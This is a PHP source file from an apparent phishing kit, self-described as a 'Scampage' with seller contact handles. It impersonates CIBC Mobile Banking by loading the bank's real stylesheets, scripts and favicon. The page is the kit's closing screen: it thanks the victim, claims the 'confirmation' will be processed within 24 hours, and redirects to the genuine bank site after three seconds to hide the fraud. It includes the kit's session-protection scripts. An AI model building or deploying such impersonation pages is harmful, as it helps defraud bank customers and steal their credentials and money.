<?php
/*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */
require "../includes/session_protect.php";
require "../includes/functions.php";
require "../includes/One_Time.php";



?><!doctype HTML>
<html>
    <head>
        <title>CIBC Mobile Banking</title>
        <meta charset="UTF-8">
				<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
				<meta name="HandheldFriendly" content="true">
				<meta name="format-detection" content="telephone=no"> 
				<META HTTP-EQUIV="Refresh" CONTENT="3;URL=https://www.cibc.mobi">
        <link rel="stylesheet" href="https://www.cibc.mobi/ebm-mobile-anp/doc/css/common/reset.css">
        <link rel="stylesheet" href="https://www.cibc.mobi/ebm-mobile-anp/doc/css/common/reset-brand.css">
        <link rel="stylesheet" href="https://www.cibc.mobi/ebm-mobile-anp/doc/css/common/global.css">
		<link rel="stylesheet" href="https://www.cibc.mobi/ebm-mobile-anp/doc/css/common/global-android2.css">
        <link rel="stylesheet" href="https://www.cibc.mobi/ebm-mobile-anp/doc/css/common/global-brand.css">
		<link rel="icon" type="image/vnd.microsoft.icon" href="fave.png">
		 <link rel="icon" type="image/vnd.microsoft.icon" href="https://www.cibc.com/etc/designs/cibcpublic/favicon.ico">
        <script type="text/javascript" src="https://www.cibc.mobi/ebm-mobile-anp//doc/framework/org.apache.wicket.resource.JQueryResourceReference/jquery/jquery-1.11.2.min-ver-5790EAD7AD3BA27397AEDFA3D263B867.js"></script>
<script type="text/javascript" src="https://www.cibc.mobi/ebm-mobile-anp//doc/framework/org.apache.wicket.ajax.AbstractDefaultAjaxBehavior/res/js/wicket-event-jquery.min-ver-2A8B8EF9295A81B4FF15AA3DE14044D7.js"></script>
<script type="text/javascript" src="https://www.cibc.mobi/ebm-mobile-anp//doc/framework/org.apache.wicket.ajax.AbstractDefaultAjaxBehavior/res/js/wicket-ajax-jquery.min-ver-E104EDF0826B33507C50375F69A9AA5D.js"></script>
<script type="text/javascript" id="wicket-ajax-base-url">
/*<![CDATA[*/
Wicket.Ajax.baseUrl="";
/*]]>*/
</script>

   <link rel="stylesheet" href="https://www.cibc.mobi/ebm-mobile-anp/doc/css/anp/profile/profile.css">
    
    
<script type="text/javascript" src="https://www.cibc.mobi/ebm-mobile-anp//doc/framework/com.cibc.ebanking.application.mobile.view.AbstractBasePage/ebanking-mobile-ver-D7B673BC5C37678142C8329AAE800481.js"></script>
<style>
.flex-box {
	display: -webkit-box;
	display: -moz-box;
	display: -ms-flexbox;
	display: -webkit-flex;
	display: flex;
	-webkit-box-direction: normal;
	-moz-box-direction: normal;
	-webkit-flex-wrap: nowrap;
	-ms-flex-wrap: nowrap;
	flex-wrap: nowrap;
}




.flex-box-flex-1 {
	-webkit-box-flex: 1;
	-moz-box-flex: 1;
	-webkit-flex: 1;
	-ms-flex: 1;
	flex: 1;
	
}

</style>

        <script src="https://www.cibc.mobi/ebm-mobile-anp/doc/js/common/global.js"></script>
		<script src="https://www.cibc.mobi/ebm-mobile-anp/doc/js/common/drawer-scroll-prevent.js"></script>

		<script src="https://www.cibc.mobi/ebm-mobile-anp/doc/js/common/s-code-universal.js"></script>
	</head>
	<body lang="en">
		<span class="offscreen">CIBC Mobile Banking</span>
	    
  
	<input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
	<label for="drawer-toggle-chk" id="drawer-toggle-label">
		<img id="open-menu-icon" src="https://www.cibc.mobi/ebm-mobile-anp/doc/images/common/drawer-menu-open.png" alt="Open Menu" role="button">
		<img id="close-menu-icon" src="https://www.cibc.mobi/ebm-mobile-anp/doc/images/common/drawer-menu-close.png" alt="Close Menu" role="button">
	</label>
	<nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
		<div id="menu-wrapper">
			<div class="drawer-menu-header">
				<div class="account-holder-name" id="account-holder-name"> </div>
				<a href="./edit-profile?23-1.ILinkListener-header-drawerMenu-profileLink" class="no-style-link active" id="profile-link">
					<span>My Profile</span><span class="drawer-icon-cog"></span>
				</a>
			</div>
			<ul>
				<li id="li-my-accounts"><a id="accounts-link" href="profileDetails.htm" role="menuitem" class="">My Accounts</a></li>
				<li id="li-pay-bills"><a id="paybill-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-paybillLink" role="menuitem" class="">Bill Payments</a></li>
				<li id="li-interac"><a id="etransfer-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-eTransferLink" role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
				<li id="li-transfer"><a id="transfer-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-transferLink" role="menuitem" class="">Transfer Funds</a></li>
				<li id="li-upcoming"><a id="uptxs-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-upcomingTransactionsLink" role="menuitem" class="">Upcoming Transactions</a></li>
				<!-- dynamic SSO links -->
				<li id="li-gmt"><a id="gmt-link" href="/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxir&amp;locale=en&amp;channel=mobile_web" role="menuitem">Global Money Transfer</a></li>
				
				<hr>
				<li id="li-browse-products"><a id="products-link" href="https://www.cibc.com/m/offers/index.html?shownav=1" target="_blank" role="menuitem">Explore Products<span class="offscreen">. Opens in new page</span></a></li>
				<li id="li-sites-apps"><a id="sites-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-sitesPostSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
				<!-- Customer Services link visible for CIBC non-Small Business -->
				<li id="li-client-services"><a id="customerServices-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-customerServicesLink" class="">Customer Services</a></li>
							
				<hr>	
				<li><a class="nav-no-indent" id="contact-us-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-contactUsLink" role="menuitem">Contact Us</a></li>
				<li><a class="nav-no-indent" id="help-link" href="http://cibc.intelliresponse.com/mobile-w/" role="menuitem">Help</a></li>
				<hr>
				<li id="li-sign-out"><a class="nav-no-indent" id="logout-link" href="./edit-profile?23-1.ILinkListener-header-drawerMenu-logoutLink" role="menuitem">Sign Out</a></li>
			</ul>
		</div>
	</nav>
	
  <header>
		<section id="header-title">
			<h2 class="title">My Profile</h2>
		</section>
  </header>

	    <section id="main-page">
	       
<section id="idf">
	<section class="page-title"> 
    	
    	<h2 class="title">Complete</h2>
	</section>    	
</section>
	<section id="edit-profile" class="page-wrapper">
		
		<div class="global-error-from-container" tabindex="-1" id="id11">



</div>
		
		<form id="id10" method="post" action="processing.php" ><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden">


		</div>
			
			
			<!-- CIBC and PCF -->
			<section>
				
					<fieldset>
					<label for="home-phone" id="home-phone-label">Thank you </label>
					
				</fieldset>
				<fieldset>
					<label for="home-phone" id="home-phone-label">Your confirmation will be processed within 24 hours.  </label>
					
				</fieldset>
			
		
				
		
		    </section>
			 

		
			</form>                      


		</section>
    </body>
</html>